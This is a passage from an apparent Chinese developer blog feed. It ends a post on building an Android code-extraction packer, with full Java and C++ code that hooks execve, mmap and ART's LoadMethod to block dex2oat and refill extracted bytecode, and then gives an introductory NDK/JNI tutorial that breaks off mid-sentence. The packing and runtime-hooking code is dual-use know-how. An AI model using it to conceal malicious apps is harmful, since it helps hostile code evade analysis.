 private byte[] decrypt(byte[] data) &#123;        for (int i = 0; i &lt; data.length; i++)&#123;            data[i] ^= (byte) 0xff;        &#125;        return data;    &#125;    //替换壳程序LoadedApk的Application为源程序Application,并调用其onCreate方法    private boolean replaceApplication()&#123;        // Application实例存在于: LoadedApk.mApplication        // 以及ActivityThread的mInitialApplication和mAllApplications和mBoundApplication        //判断源程序是否使用自定义Application 若使用则需要进行替换,若未使用则直接返回,使用壳的默认Application即可        String appClassName = null; //源程序的Application类名        try &#123;            //获取AndroidManifest.xml 文件中的 &lt;meta-data&gt; 元素            ApplicationInfo applicationInfo = getPackageManager().getApplicationInfo(this.getPackageName(), PackageManager.GET_META_DATA);            Bundle metaData = applicationInfo.metaData;            //获取xml文件声明的Application类            if (metaData != null &amp;&amp; metaData.containsKey(&quot;APPLICATION_CLASS_NAME&quot;))&#123;                appClassName = metaData.getString(&quot;APPLICATION_CLASS_NAME&quot;);            &#125; else &#123;                log(&quot;源程序中没有自定义Application&quot;);                return false; //如果不存在直接返回,使用壳的application即可            &#125;        &#125; catch (PackageManager.NameNotFoundException e) &#123;            log(Log.getStackTraceString(e));        &#125;        //源程序存在自定义application类,开始替换        log(&quot;Try to replace Application&quot;);        //1.反射获取ActivityThread实例        Object sCurrentActivityThreadObj = Reflection.getStaticField(&quot;android.app.ActivityThread&quot;,&quot;sCurrentActivityThread&quot;);        log(&quot;ActivityThread: &quot; + sCurrentActivityThreadObj.toString());        //2.获取并设置LoadedApk        //获取mBoundApplication (AppBindData对象)        Object mBoundApplicationObj = Reflection.getField(&quot;android.app.ActivityThread&quot;,sCurrentActivityThreadObj,&quot;mBoundApplication&quot;) ;        log(&quot;mBoundApplication: &quot;+mBoundApplicationObj.toString());        //获取mBoundApplication.info (即LoadedApk)        Object infoObj = Reflection.getField(&quot;android.app.ActivityThread$AppBindData&quot;,mBoundApplicationObj,&quot;info&quot;);        log( &quot;LoadedApk: &quot; + infoObj.toString());        //把LoadedApk的mApplication设置为null,这样后续才能调用makeApplication() 否则由于已存在Application,无法进行替换        Reflection.setField(&quot;android.app.LoadedApk&quot;,&quot;mApplication&quot;,infoObj,null);        //3.获取ActivityThread.mInitialApplication 即拿到旧的Application(对于要加载的Application来讲)        Object mInitialApplicationObj = Reflection.getField(&quot;android.app.ActivityThread&quot;,sCurrentActivityThreadObj,&quot;mInitialApplication&quot;);        log(&quot;mInitialApplicationObj: &quot; + mInitialApplicationObj.toString());        //4.获取ActivityThread.mAllApplications并删除旧的application        ArrayList&lt;Application&gt; mAllApplicationsObj = (ArrayList&lt;Application&gt;) Reflection.getField(&quot;android.app.ActivityThread&quot;,sCurrentActivityThreadObj,&quot;mAllApplications&quot;);        mAllApplicationsObj.remove(mInitialApplicationObj);        log(&quot;mInitialApplication 从 mAllApplications 中移除成功&quot;);        //5.重置相关类的Application类名 便于后续创建Application        //获取LoadedApk.mApplicationInfo        ApplicationInfo applicationInfo = (ApplicationInfo) Reflection.getField(&quot;android.app.LoadedApk&quot;,infoObj,&quot;mApplicationInfo&quot;);        log( &quot;LoadedApk.mApplicationInfo: &quot; + applicationInfo.toString());        //获取mBoundApplication.appInfo        ApplicationInfo appinfoInAppBindData = (ApplicationInfo) Reflection.getField(&quot;android.app.ActivityThread$AppBindData&quot;,mBoundApplicationObj,&quot;appInfo&quot;);        log(&quot;ActivityThread.mBoundApplication.appInfo: &quot; + appinfoInAppBindData.toString());        //此处通过引用修改值,虽然后续没有使用,但是实际上是修改其指向的LoadedApk相关字段的值        //设置两个appinfo的classname为源程序的application类名,以便后续调用makeApplication()创建源程序的application        applicationInfo.className = appClassName;        appinfoInAppBindData.className = appClassName;        log(&quot;Source Application name: &quot; + appClassName);        //6.反射调用makeApplication方法创建源程序的application        Application application = (Application) Reflection.invokeMethod(&quot;android.app.LoadedApk&quot;,&quot;makeApplication&quot;,infoObj,new Class[]&#123;boolean.class, Instrumentation.class&#125;,new Object[]&#123;false,null&#125;); //使用源程序中的application        //Application app = (Application)ReflectionMethods.invokeMethod(&quot;android.app.LoadedApk&quot;,&quot;makeApplication&quot;,infoObj,new Class[]&#123;boolean.class, Instrumentation.class&#125;,new Object[]&#123;true,null&#125;); //使用自定义的application 强制为系统默认        log(&quot;Create source Application succeed: &quot;+application);        //7.重置ActivityThread.mInitialApplication为新的Application        Reflection.setField(&quot;android.app.ActivityThread&quot;,&quot;mInitialApplication&quot;,sCurrentActivityThreadObj,application);        log(&quot;Reset ActivityThread.mInitialApplication by new Application succeed!&quot;);        //8.ContentProvider会持有代理的Application,需要特殊处理一下        ArrayMap mProviderMap = (ArrayMap) Reflection.getField(&quot;android.app.ActivityThread&quot;,sCurrentActivityThreadObj,&quot;mProviderMap&quot;);        log(&quot;ActivityThread.mProviderMap: &quot; + mProviderMap);        //获取所有provider,装进迭代器中遍历        Iterator iterator = mProviderMap.values().iterator();        while(iterator.hasNext())&#123;            Object providerClientRecord = iterator.next();            //获取ProviderClientRecord.mLocalProvider,可能为空            Object mLocalProvider = Reflection.getField(&quot;android.app.ActivityThread$ProviderClientRecord&quot;,providerClientRecord,&quot;mLocalProvider&quot;) ;            if(mLocalProvider != null)&#123;                log(&quot;ProviderClientRecord.mLocalProvider: &quot; + mLocalProvider);                //获取ContentProvider中的mContext字段,设置为新的Application                Reflection.setField(&quot;android.content.ContentProvider&quot;,&quot;mContext&quot;,mLocalProvider,application);            &#125;        &#125;        log( &quot;Run Application.onCreate&quot; );        application.onCreate(); //源程序,启动!        return true;    &#125;    // 替换壳App的ClassLoader为源App的ClassLoader    private void replaceClassLoader() &#123;        //1.获取当前的classloader        ClassLoader classLoader = this.getClassLoader();        log(&quot;Current ClassLoader: &quot; + classLoader.toString());        log(&quot;Parent ClassLoader: &quot; + classLoader.getParent().toString());        //2.反射获取ActivityThread        Object sCurrentActivityThreadObj = Reflection.getStaticField(&quot;android.app.ActivityThread&quot;,&quot;sCurrentActivityThread&quot;);        log(&quot;ActivityThread.sCurrentActivityThread: &quot; + sCurrentActivityThreadObj.toString());        //3.反射获取LoadedApk        //获取当前ActivityThread实例的mPackages字段 类型为ArrayMap&lt;String, WeakReference&lt;LoadedApk&gt;&gt;, 里面存放了当前应用的LoadedApk对象        ArrayMap mPackagesObj = (ArrayMap) Reflection.getField(&quot;android.app.ActivityThread&quot;,sCurrentActivityThreadObj,&quot;mPackages&quot;);        log( &quot;mPackagesObj: &quot; + mPackagesObj.toString());        //获取mPackages中的当前应用包名        String currentPackageName = this.getPackageName();        log(&quot;currentPackageName: &quot; + currentPackageName);        // 获取loadedApk实例也有好几种,mInitialApplication mAllApplications mPackages        // 通过包名获取当前应用的loadedApk实例        WeakReference weakReference = (WeakReference) mPackagesObj.get(currentPackageName);        Object loadedApkObj = weakReference.get();        log( &quot;LoadedApk: &quot; + loadedApkObj.toString());        //4.替换ClassLoader        DexClassLoader dexClassLoader = new DexClassLoader(dexPath, odexPath,libPath, classLoader.getParent()); //动态加载源程序的dex文件,以当前classloader的父加载器作为parent        Reflection.setField(&quot;android.app.LoadedApk&quot;,&quot;mClassLoader&quot;,loadedApkObj,dexClassLoader); //替换当前loadedApk实例中的mClassLoader字段        log(&quot;New DexClassLoader: &quot; + dexClassLoader);    &#125;&#125;</code></pre><hr><h6 id="shell-cpp"><a href="#shell-cpp" class="headerlink" title="shell.cpp"></a>shell.cpp</h6><p>主要提供以下功能：</p><ol><li><p>hook execve</p><ul><li>主要目的是禁止 dex2oat，防止 dex 文件被优化；</li></ul></li><li><p>hook mmap</p><ul><li>使 dex 文件可写,用于后续指令回填；</li></ul></li><li><p>hook LoadMethod</p><ul><li>loadmethod 用于加载 dex 文件的方法，可获取 dex 文件引用和 codeoff；</li><li>hook劫持后执行codes文件解析和指令回填。</li></ul><pre><code class="language-c++">#include &lt;jni.h&gt;#include &lt;string&gt;#include &lt;unistd.h&gt;#include &lt;map&gt;#include &lt;fstream&gt;#include &lt;stdlib.h&gt;#include &lt;elf.h&gt;#include &lt;dlfcn.h&gt;#include &quot;android/log.h&quot;#include &quot;sys/mman.h&quot;#include &quot;bytehook.h&quot;#include &quot;dobby/dobby.h&quot;#include &quot;dex/DexFile.h&quot;#include &quot;dex/CodeItem.h&quot;#include &quot;dex/class_accessor.h&quot;#define TAG &quot;NshIdE&quot;#define logd(...) __android_log_print(ANDROID_LOG_DEBUG, TAG, __VA_ARGS__);#define logi(...) __android_log_print(ANDROID_LOG_INFO , TAG, __VA_ARGS__);#define loge(...) __android_log_print(ANDROID_LOG_ERROR, TAG, __VA_ARGS__);// sdk版本,用于兼容适配int APILevel;// 函数声明void hook();void hookExecve();void hookMmap();void hook_LoadMethod();// 抽取代码文件,与源.dex在同一私有目录std::string codeFilePostfix = &quot;.codes&quot;;//dex文件名-&gt;codeOff-&gt;CodeItem 每个dex文件对应一个map,每个map内的codeoff对应一个CodeItemstd::map&lt;std::string,std::map&lt;uint32_t, CodeItem&gt;&gt; codeMapList;//art/runtime/class_linker.h// 函数声明static void (*g_originLoadMethod)(void* thiz,                                  const DexFile* dex_file,                                  ClassAccessor::Method* method,                                  void* klass,                                  void* dst);/*//Android 10-14 原型如下void LoadMethod(const DexFile&amp; dex_file,                const ClassAccessor::Method&amp; method,                Handle&lt;mirror::Class&gt; klass,                ArtMethod* dst);*/// Tool functions// 以二进制形式读取整个文件,返回字节数组并返回文件长度uint8_t* readFileToBytes(const std::string fileName,size_t* readSize) &#123;    FILE *file = fopen(fileName.c_str(), &quot;rb&quot;);    if (file == NULL) &#123;        logd(&quot;Error opening file&quot;);        fclose(file);        return NULL;    &#125;    fseek(file, 0,SEEK_END);    size_t fileSize = ftell(file);    fseek(file, 0,SEEK_SET);    uint8_t *buffer = (uint8_t *) malloc(fileSize);    if (buffer == NULL) &#123;        logd(&quot;Error allocating memory\n&quot;);        fclose(file);        return NULL;    &#125;    size_t bytesRead = fread(buffer, 1, fileSize, file);    if(bytesRead!=fileSize) &#123;        logd(&quot;Read bytes not equal file size!\n&quot;);        free(buffer);        fclose(file);        return NULL;    &#125;    fclose(file);    if(readSize)        *readSize=bytesRead;    return buffer;&#125;// 4字节数组转uint32_tuint32_t bytes2uint32(unsigned char * bytes)&#123;    uint32_t retnum = 0;    for(int i = 3;i &gt;=0;i--)&#123;        retnum &lt;&lt;= 8;        retnum |= bytes[i];    &#125;    return retnum;&#125;const char * getArtLibPath() &#123;    if(APILevel &lt; 29) &#123;        return &quot;/system/lib64/libart.so&quot;;    &#125; else if(APILevel == 29) &#123;        return &quot;/apex/com.android.runtime/lib64/libart.so&quot;;    &#125; else &#123;        return &quot;/apex/com.android.art/lib64/libart.so&quot;;    &#125;&#125;const char * getArtBaseLibPath() &#123;    if(APILevel == 29) &#123;        return &quot;/apex/com.android.runtime/lib64/libartbase.so&quot;;    &#125; else &#123;        return &quot;/apex/com.android.art/lib64/libartbase.so&quot;;    &#125;&#125;const char* find_symbol_in_elf_file(const char *elf_file,int keyword_count,...) &#123;    FILE *elf_fp = fopen(elf_file, &quot;r&quot;);    if (elf_fp) &#123;        // 获取elf文件大小        fseek(elf_fp, 0L, SEEK_END);        size_t lib_size = ftell(elf_fp);        fseek(elf_fp, 0L, SEEK_SET);        // 读取elf文件数据        char *data = (char *) calloc(lib_size, 1);        fread(data, 1, lib_size, elf_fp);        char *elf_bytes_data = data;        // elf头        Elf64_Ehdr *ehdr = (Elf64_Ehdr *) elf_bytes_data;        // 节头        Elf64_Shdr *shdr = (Elf64_Shdr *) (((uint8_t *) elf_bytes_data) + ehdr-&gt;e_shoff);        va_list kw_list;        // 遍历节        for (int i = 0; i &lt; ehdr-&gt;e_shnum; i++) &#123;            // 字符串表            if (shdr-&gt;sh_type == SHT_STRTAB) &#123;                const char *str_base = (char *) ((uint8_t *) elf_bytes_data + shdr-&gt;sh_offset);                char *ptr = (char *) str_base;                // 遍历字符串表                for (int k = 0; ptr &lt; (str_base + shdr-&gt;sh_size); k++) &#123;                    const char *item_value = ptr;                    size_t item_len = strnlen(item_value, 128);                    ptr += (item_len + 1);                    if (item_len == 0) &#123;                        continue;                    &#125;                    int match_count = 0;                    va_start(kw_list, keyword_count);                    for (int n = 0; n &lt; keyword_count; n++) &#123;                        const char *keyword = va_arg(kw_list, const char*);                        if (strstr(item_value, keyword)) &#123;                            match_count++;                        &#125;                    &#125;                    va_end(kw_list);                    if (match_count == keyword_count) &#123;                        return item_value;                    &#125;                &#125;                break;            &#125;            shdr++;        &#125;        fclose(elf_fp);        free(data);    &#125;    return nullptr;&#125;const char * getClassLinkerDefineClassLibPath()&#123;    return getArtLibPath();&#125;const char * getClassLinkerDefineClassSymbol() &#123;    const char * sym = find_symbol_in_elf_file(getClassLinkerDefineClassLibPath(),2,&quot;ClassLinker&quot;,&quot;DefineClass&quot;);    return sym;&#125;const char * getClassLinkerLoadMethodLibPath()&#123;    return getArtLibPath();&#125;//获取ClassLinker::LoadMethod真实符号名const char * getClassLinkerLoadMethodSymbol() &#123;    const char * sym = find_symbol_in_elf_file(getClassLinkerLoadMethodLibPath(),2,&quot;ClassLinker&quot;,&quot;LoadMethod&quot;);    return sym;&#125;//获取libart真实名称const char * getArtLibName() &#123;    //Android 10及以后变为libartbase.so    return APILevel &gt;= 29 ? &quot;libartbase.so&quot; : &quot;libart.so&quot;;&#125;// 禁用dex2oatint fakeExecve(const char *pathname, char *const argv[], char *const envp[]) &#123;    BYTEHOOK_STACK_SCOPE();    // 禁用dex2oat    if (strstr(pathname, &quot;dex2oat&quot;) != nullptr) &#123;        errno = EACCES;        return -1;    &#125;    return BYTEHOOK_CALL_PREV(fakeExecve, pathname, argv, envp);&#125;void hookExecve()&#123;    bytehook_stub_t stub = bytehook_hook_single(            getArtLibName(),            &quot;libc.so&quot;,            &quot;execve&quot;,            (void *) fakeExecve,            nullptr,            nullptr);    if (stub != nullptr) &#123;        logd(&quot;hook execve done&quot;);    &#125;&#125;//为dex文件添加可写权限void* fakeMmap(void * __addr, size_t __size, int __prot, int __flags, int __fd, off_t __offset)&#123;    BYTEHOOK_STACK_SCOPE();    int prot = __prot;    int hasRead = (__prot &amp; PROT_READ) == PROT_READ;    int hasWrite = (__prot &amp; PROT_WRITE) == PROT_WRITE;    // 添加写权限    if(hasRead &amp;&amp; !hasWrite) &#123;        prot |= PROT_WRITE;    &#125;    void * addr = BYTEHOOK_CALL_PREV(fakeMmap, __addr, __size, prot, __flags, __fd, __offset);    return addr;&#125;void hookMmap()&#123;    bytehook_stub_t stub = bytehook_hook_single(            getArtLibName(),            &quot;libc.so&quot;,            &quot;mmap&quot;,            (void *) fakeMmap,            nullptr,            nullptr);    if(stub != nullptr)&#123;        logd(&quot;hook mmap done&quot;);    &#125;&#125;// 解析抽取代码文件,每个dex.codes只解析一次void parseExtractedCodeFiles(const std::string&amp; dexPath)&#123;    //1.读取代码文件为字节数组    std::string codeFilePath=dexPath+codeFilePostfix;    logd(&quot;Code File Path: %s&quot;,codeFilePath.c_str());    size_t codeBytesLen = 0;    uint8_t* codeBytes = readFileToBytes(codeFilePath, &amp;codeBytesLen);    if(codeBytes == nullptr || codeBytesLen == 0) &#123;        logd(&quot;Code file not found!&quot;)        return;    &#125;    logd(&quot;CodeFile: %s Len:%#llx&quot;, codeFilePath.c_str(),codeBytesLen);    // 2.解析代码字节数组    size_t offset=0;    while(offset&lt;codeBytesLen)&#123;        uint8_t* pointer = codeBytes + offset;  //每个结构的起点指针        uint32_t codeOff = bytes2uint32(pointer); // 4字节CodeOff和4字节InsnSize        uint32_t insnSize = bytes2uint32(pointer+4);        if(codeOff == 0 || insnSize == 0)&#123;            logd(&quot;CodeOff or InsnSize equals 0!&quot;)            break;        &#125;        logd(&quot;CodeOff: %#x InsnSize: %#x&quot;, codeOff, insnSize);        // 创建抽取代码对象        CodeItem codeItem = CodeItem(insnSize, pointer+8);        // 添加一组CodeOff:CodeItem映射        codeMapList[dexPath].insert(std::pair&lt;uint32_t, CodeItem&gt;(codeOff, codeItem));        logd(&quot;CodeItem codeOff: %#x insnSize: %#x has created!&quot;, codeOff, insnSize);        offset += 8 + insnSize*2; //跳过CodeOff,InsnSize和Insn[]    &#125;&#125;// 回填dex的方法代码,每次只回填一个Methodvoid innerLoadMethod(void* thiz, const DexFile* dexFile, ClassAccessor::Method* method, void* klass, void* dest)&#123;    // dex文件路径    std::string location = dexFile-&gt;location_;    //logd(&quot;Load Dex File Location: %s&quot;,location.c_str())    // 判断是否为解密释放的dex文件,位于私有目录内    if(location.find(&quot;app_tmp_dex&quot;) == std::string::npos)&#123;        return;    &#125;    // 如果未解析过dexCodes文件则进行解析,每个dex文件只解析一次,创建对应的map&lt;CodeOff,CodeItem&gt;映射    if(codeMapList.find(location)==codeMapList.end())&#123;        logd(&quot;Parse dex file %s codes&quot;,location.c_str());        codeMapList[location]=std::map&lt;uint32_t,CodeItem&gt;(); //创建新的codeMap        parseExtractedCodeFiles(location);    &#125;    // 不存在DexCode 直接跳过    if(method-&gt;code_off_==0)&#123;        return;    &#125;    // 指令地址    uint8_t* codeAddr = (uint8_t*)(dexFile-&gt;begin_ + method-&gt;code_off_ + 16); //insn结构前面有16字节    //logd(&quot;MethodCodeOff: %d&quot;,method-&gt;code_off_);    // 回填指令    std::map&lt;uint32_t,CodeItem&gt; codeMap=codeMapList[location];    // 似乎没有走到回填指令处 (注意c++浅拷贝问题,不能随意delete)    if(codeMap.find(method-&gt;code_off_) != codeMap.end())&#123;        CodeItem codeItem = codeMap[method-&gt;code_off_];        memcpy(codeAddr,codeItem.getInsns(),codeItem.getInsnsSize()*2); //注意指令为u2类型,长度需要*2    &#125;&#125;void newLoadMethod(void* thiz, const DexFile* dex_file, ClassAccessor::Method* method, void* klass, void* dest)&#123;    if(g_originLoadMethod!= nullptr)&#123;        // 先回填指令,再调用        innerLoadMethod(thiz,dex_file,method,klass,dest);        g_originLoadMethod(thiz,dex_file,method, klass, dest);    &#125;    return;&#125;void hook_LoadMethod()&#123;    void * loadMethodAddress =  DobbySymbolResolver(getClassLinkerLoadMethodLibPath(),getClassLinkerLoadMethodSymbol());    DobbyHook(loadMethodAddress, (void *) newLoadMethod, (void **) &amp;g_originLoadMethod);    logd(&quot;hook LoadMethod done&quot;);&#125;// 初始函数,实现hookextern &quot;C&quot;void _init()&#123;    APILevel = android_get_device_api_level();    logd(&quot;Android API Level: %d&quot;, APILevel)    logd(&quot;Setting hook...&quot;)    hook();&#125;// hookvoid hook()&#123;    bytehook_init(BYTEHOOK_MODE_AUTOMATIC, false);    hookExecve();   // 禁用dex2oat    hookMmap();     // 使dex文件可写    //hook_DefineClass(); //需手动解析ClassDef    hook_LoadMethod();  // 加载方法时回填指令&#125;</code></pre></li></ol><h3 id="四、加固测试"><a href="#四、加固测试" class="headerlink" title="四、加固测试"></a>四、加固测试</h3><p>只需要执行以下指令</p><pre><code class="language-shell">python ThirdAndroidShell.py -src &lt;源程序Apk路径&gt; -shell &lt;壳程序Apk路径&gt; -out &lt;加壳后的Apk路径&gt;</code></pre><p>然后就可以得到加固之后的 APK</p><h3 id="五、参考"><a href="#五、参考" class="headerlink" title="五、参考"></a>五、参考</h3><p>[<a href="https://bbs.kanxue.com/thread-286929-1.htm#msg_header_h2_32">原创]Android从整体加固到抽取加固的实现及原理-Android安全-看雪-安全社区|安全招聘|kanxue.com</a></p><p><a href="https://bbs.kanxue.com/thread-285870.htm">安卓壳学习记录-加壳脱壳-看雪-安全社区|安全招聘|kanxue.com</a></p>]]></content>
      
      
      <categories>
          
          <category> Android学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 开发--NDK 开发</title>
      <link href="/2025/08/14/Android%20%E5%BC%80%E5%8F%91%E2%80%94%E2%80%94NDK%20%E5%BC%80%E5%8F%91/"/>
      <url>/2025/08/14/Android%20%E5%BC%80%E5%8F%91%E2%80%94%E2%80%94NDK%20%E5%BC%80%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<h1 id="Android-开发——NDK-开发"><a href="#Android-开发——NDK-开发" class="headerlink" title="Android 开发——NDK 开发"></a>Android 开发——NDK 开发</h1><h3 id="一、NDK-介绍"><a href="#一、NDK-介绍" class="headerlink" title="一、NDK 介绍"></a>一、NDK 介绍</h3><h4 id="1-1-App-中为什么部分代码需要放到-so-中"><a href="#1-1-App-中为什么部分代码需要放到-so-中" class="headerlink" title="1.1 App 中为什么部分代码需要放到 so 中"></a>1.1 App 中为什么部分代码需要放到 so 中</h4><ul><li>虽然 Java 是平台无关性语言，但是运行 Java 语言的虚拟机是运行在具体平台上的，也就是说 Java 虚拟机是平台相关的。因此，在调用平台 API 的功能时，虽然在 Java 语言层是平台无关的，但背后只能通过 JNI 技术在 Native 层分别调用不同平台 API（例如打开文件功能，在 Window 平台是 openFile 函数，而在 Linux 平台是 open 函数）。类似的，对于有操作硬件需求的程序，也只能通过 C&#x2F;C++ 实现对硬件的操作，再通过 JNI 调用。而 NDK 提供了 JNI 的工具和环境；</li><li>C&#x2F;C++ 代码的执行效率比 Java 高；</li><li>Native 层代码安全性更高，反编译 so 文件的难度比反编译 Class 文件高，一些跟密码相关的功能会选择用 C&#x2F;C++ 实现；</li><li>复用现有代码，当 C&#x2F;C++ 存在程序需要的功能时，则可以直接复用。</li></ul><hr><h4 id="1-2-什么是-JNI"><a href="#1-2-什么是-JNI" class="headerlink" title="1.2 什么是 JNI"></a>1.2 什么是 JNI</h4><p><strong>JNI</strong> 是 Java Native Interface 的缩写。从 Java1.1 开始，JNI 标准成为 Java 平台的一部分，允许 Java 代码和其他语言写的代码进行交互。也就是说 <strong>JNI</strong> 是 Java 平台层面制定的“标准”，任何语言只要遵守这个规则都能跟 Java 交互。</p><hr><h4 id="1-3-什么是-NDK"><a href="#1-3-什么是-NDK" class="headerlink" title="1.3 什么是 NDK"></a>1.3 什么是 NDK</h4><p><strong>NDK</strong> 是Google 提供的工具，让我们可以在 <strong>Android</strong> 上用 <strong>C&#x2F;C++</strong> 写代码，方便实现 JNI 交互和性能优化。</p><p>官方的介绍：<a href="https://developer.android.com/ndk/guides?hl=zh-cn">NDK 使用入门  | Android NDK  | Android Developers</a></p><hr><h4 id="1-4-ABI-与指令集"><a href="#1-4-ABI-与指令集" class="headerlink" title="1.4 ABI 与指令集"></a>1.4 ABI 与指令集</h4><p>不同的 Android 设备使用不同的 CPU，而不同的 CPU 支持不同的指令集。CPU 与指令集的每种组合都有专属的应用二进制接口 (ABI)。详见：<a href="https://developer.android.com/ndk/guides/abis?hl=zh-cn">Android ABI  | Android NDK  | Android Developers</a></p><h3 id="二、NDK-和-普通-Java-工程的区别"><a href="#二、NDK-和-普通-Java-工程的区别" class="headerlink" title="二、NDK 和 普通 Java 工程的区别"></a>二、NDK 和 普通 Java 工程的区别</h3><ol><li><p>Java 代码中多了加载 so 和 声明所需要加载的 so 中函数的代码<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250814162811188.png" alt="image-20250814162811188"></p></li><li><p><strong>main</strong> 目录中多了一个 <strong>cpp</strong> 目录，其中包含有 CMakeLists.txt 和 cpp 文件</p></li></ol><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250814163000493.png" alt="image-20250814163000493"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250814163043199.png" alt="image-20250814163043199"></p><ol start="3"><li>build.gradle 中也多了一些代码<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250814163915526.png" alt="image-20250814163915526"></li></ol><p>默认是支持四种 ABI，如果需要限制安装包大小可以选择只支持一部分 ABI</p><pre><code class="language-kotlin">defaultConfig &#123;    // ...    ndk &#123;        abiFilters += listOf(&quot;armeabi-v7a&quot;, &quot;arm64-v8a&quot;, &quot;x86&quot;, &quot;x86_64&quot;)    &#125;&#125;</code></pre><p>三、第一个 NDK 工程</p><ol><li>CMakeLists.txt 介绍</li></ol><pre><code class="language-ASN.1"># For more information about using CMake with Android Studio, read the# documentation: https://d.android.com/studio/projects/add-native-code.html.# For more examples on how to use CMake, see https://github.com/android/ndk-samples.# 说明：这几行是官方提供的参考链接，方便你学习 CMake 和 NDK 的使用。# Sets the minimum CMake version required for this project.cmake_minimum_required(VERSION 3.22.1)# 设置本项目要求的 CMake 最低版本，这里是 3.22.1。# 如果你的系统 CMake 版本低于这个，会直接报错。# Declares the project name. The project name can be accessed via $&#123; PROJECT_NAME&#125;,# Since this is the top level CMakeLists.txt, the project name is also accessible# with $&#123;CMAKE_PROJECT_NAME&#125; (both CMake variables are in-sync within the top level# build script scope).project(&quot;javaandnative&quot;)# 定义项目名称为 &quot;javaandnative&quot;。# 在这个顶层 CMakeLists.txt 中，$&#123;PROJECT_NAME&#125; 和 $&#123;CMAKE_PROJECT_NAME&#125; 都可以访问这个名字。# Creates and names a library, sets it as either STATIC# or SHARED, and provides the relative paths to its source code.# You can define multiple libraries, and CMake builds them for you.# Gradle automatically packages shared libraries with your APK.## In this top level CMakeLists.txt, $&#123;CMAKE_PROJECT_NAME&#125; is used to define# the target library name; in the sub-module&#39;s CMakeLists.txt, $&#123;PROJECT_NAME&#125;# is preferred for the same purpose.## In order to load a library into your app from Java/Kotlin, you must call# System.loadLibrary() and pass the name of the library defined here;# for GameActivity/NativeActivity derived applications, the same library name must be# used in the AndroidManifest.xml file.add_library($&#123;CMAKE_PROJECT_NAME&#125; SHARED        # List C/C++ source files with relative paths to this CMakeLists.txt.        native-lib.cpp)# 创建一个库（library）。# $&#123;CMAKE_PROJECT_NAME&#125; → 这里会替换成 &quot;javaandnative&quot;，也就是库的名字。# SHARED 表示生成的是动态库（.so 文件），不是静态库（.a）。# 后面是库包含的源文件列表，这里只有 native-lib.cpp。# 注意：如果要在 Java/Kotlin 中加载这个库，需要调用 System.loadLibrary(&quot;javaandnative&quot;)。# Specifies libraries CMake should link to your target library. You# can link libraries from various origins, such as libraries defined in this# build script, prebuilt third-party libraries, or Android system libraries.target_link_libraries($&#123;CMAKE_PROJECT_NAME&#125;        # List libraries link to the target library        android        log)# 指定要和你的库一起链接的其他库。# $&#123;CMAKE_PROJECT_NAME&#125; 是你的库名字（javaandnative）。# 这里链接了两个 Android NDK 自带的库：#   android → 提供 Android NDK 相关 API（如 NativeActivity）。#   log → 提供 __android_log_print 等日志函数，用于在 logcat 输出调试信息。</code></pre><ol start="2"><li><p>so 的加载</p><pre><code class="language-Java">    // Used to load the &#39;javaandnative&#39; library on application startup.    static &#123;        System.loadLibrary(&quot;javaandnative&quot;);    &#125;</code></pre></li><li><p>native 层函数的声明</p><pre><code class="language-Java">    /**     * A native method that is implemented by the &#39;javaandnative&#39; native library,     * which is packaged with this application.     */    public native String stringFromJNI();</code></pre></li><li><p>JNI 函数的静态注册规则</p><pre><code class="language-c++">#include &lt;jni.h&gt;#include &lt;string&gt;extern &quot;C&quot; JNIEXPORT jstring JNICALLJava_com_example_javaandnative_MainActivity_stringFromJNI(        JNIEnv* env,        jobject /* this */) &#123;    std::string hello = &quot;Hello from C++&quot;;    return env-&gt;NewStringUTF(hello.c_str());&#125;</code></pre></li></ol><p>Java_包名_类_方法名</p><ol start="5"><li><p>JNIEnv、jobject&#x2F;jclass<br>jobject 在 native 函数的声明改为 static 时，使用 jclass，因为静态方法可以通过类直接调用。</p></li><li><p>NewstringUTF<br>Java 的数据和 so 的数据不互通，如果 so 的数据最后要转到 java 层处理就需要 NewstringUTF，因此 <strong>NewstringUTF</strong> 可以成为一个 <strong>hook</strong> 点。</p></li><li><p>在 NDK 开发中，一定要注意哪些是 Java 的数据类型，哪些是 C&#x2F;C++ 的数据类型，在适当的时候需要转换，<strong>hello.c_str()</strong> 获取 C&#x2F;C++ 字符串的类型，jstring 是 Java 字符串类型。</p></li><li><p>extern “C” JNIEXPORT jstring JNICALL</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250814165550808.png" alt="image-20250814165550808"></p></li></ol><p>JNICALL 是空的，JNIEXPORT 代表把函数导出，给函数添加了默认的可见属性</p><ol start="9"><li>自定义 ABI 或者 自定义命名 so<br>在 <strong>CMakeLists.txt</strong> 中修改 <strong>project</strong> 中的文件名即可自定义命名 so；自定义 ABI 也在上文中提到即在 gradle.build 中添加条件即可。</li></ol><h3 id="三、so-中常用的-Log-输出"><a href="#三、so-中常用的-Log-输出" class="headerlink" title="三、so 中常用的 Log 输出"></a>三、so 中常用的 Log 输出</h3><pre><code class="language-c++">#include &lt;jni.h&gt;#include &lt;string&gt;#include &lt;android/log.h&gt;#define TAG &quot;NshIdE&quot;#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, TAG, __VA_ARGS__);#define LOGI(...) __android_log_print(ANDROID_LOG_INFO , TAG, __VA_ARGS__);#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, TAG, __VA_ARGS__);extern &quot;C&quot; JNIEXPORT jstring JNICALLJava_com_example_javaandnative_MainActivity_stringFromJNI(        JNIEnv* env,        jobject /* this */) &#123;    std::string hello = &quot;Hello from C++&quot;;    LOGD(&quot;LOGD test%d&quot;, 1);    LOGI(&quot;LOGI test%d,%d&quot;, 1, 2);    LOGE(&quot;LOGE test%d,%d,%d&quot;, 1, 2, 3);    return env-&gt;NewStringUTF(hello.c_str());&#125;</code></pre><p>这是自定义的，当然也可以使用官方的，即不用 LOGD、LOGI 等进行包装，直接使用 <strong>__android_log_print</strong>。</p><h3 id="四、NDK-多线程"><a href="#四、NDK-多线程" class="headerlink" title="四、NDK 多线程"></a>四、NDK 多线程</h3><pre><code class="language-Java">int pthread_create(pthread_t* __pthread_ptr, pthread_attr_t const* __attr, void* (*__start_routine)(void*), void*);</code></pre><p>第一个是指向 